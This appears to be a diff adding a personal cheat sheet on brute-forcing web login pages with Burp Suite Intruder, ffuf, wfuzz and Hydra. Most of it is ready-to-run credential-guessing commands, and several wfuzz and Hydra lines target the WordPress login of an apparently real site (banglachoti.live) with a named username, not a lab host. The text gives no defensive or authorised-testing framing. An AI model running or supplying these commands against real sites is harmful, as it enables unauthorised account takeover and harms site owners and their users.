@@ -1,0 +1,35 @@
+Brute Force Attack in AnyLogin Page:
+
+There are some ways to bruteforce a Login page. You need BurpSuite, BurpSuite Pro, Hydra, Fuzz, Wfuzz etc.
+
+BurpSuite : first intercept the request, then go to the intruder and target admin or password, and then start the attack Then Using FFUF tool.
+
+Method 01: First, intercept with a burp and send it to the repeater, then find the response and send it to the intruder, then select the target, select the wordlist, and attack. 
+
+Method 02:
+This is For Bruteforce finding admin and pass:
+--> first give wrong username and password and intercept the request and copy to file and svae it
+--> then if you want to find the username so use "username=FUZZ" or you want to find the password "password=FUZZ"
+--> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -mc 200
+--> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -fs <file_size>
+--> ffuf -request req.txt -request-proto http -mode cluster-bomb -w /usr/share/seclists/Passwords/any txt file -mc 200
+--> ffuf -request req.txt -request-proto http -w passlist.txt -fs 30
+
+ffuf -request req.txt -w passlist.txt:USER -w passlist.txt:PASS -mc all -fc 500,401 ["user":"USER","password":"PASS"]
+ffuf -w usernames.txt:W1,passlist.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://localhost:3000/login -fc 200
+ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
+
+wfuzz -c -z file,pass.txt --hc 404 -u http://abc.xyz/FUZZ
+wfuzz -c -z file,pass.txt --hs Invalid -d "log=admin&pwd=FUZZ" -u https://example.com/wp-login.php
+wfuzz -c -z file,passlist.txt --hs Invalid -d "log=banglachoti&pwd=FUZZ" -u https://banglachoti.live/wp-login.php
+wfuzz -c -z file,username.txt -z file,password.txt -b "Cookie=" -d "log=FUZZ&pwd=FUZZ2Z" -u http://example.xyz
+
+hydra -l admin -P passlist.txt https://banglachoti.live/wp-login.php http-post-form "log=^USER^&pwd=^PASS^&wp-submit=Log+In:Incorrect"
+hydra -l banglachoti -P passlist.txt http-post-form://banglachoti.live/wp-login.php:"log=^USER^&pwd=^PASS^&wp-submit=Log+In:Incorrect"
+hydra link -l admin -P passlist.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
+hydra banglachoti.live -l banglachoti -P passlist.txt http-post-form "/wp-login.php:username=^USER^&password=^PASS^:F= The password you entered for the username banglachoti is incorrect."
+
+
+
+https://www.youtube.com/watch?v=KeRYT-NjwgI
+https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login
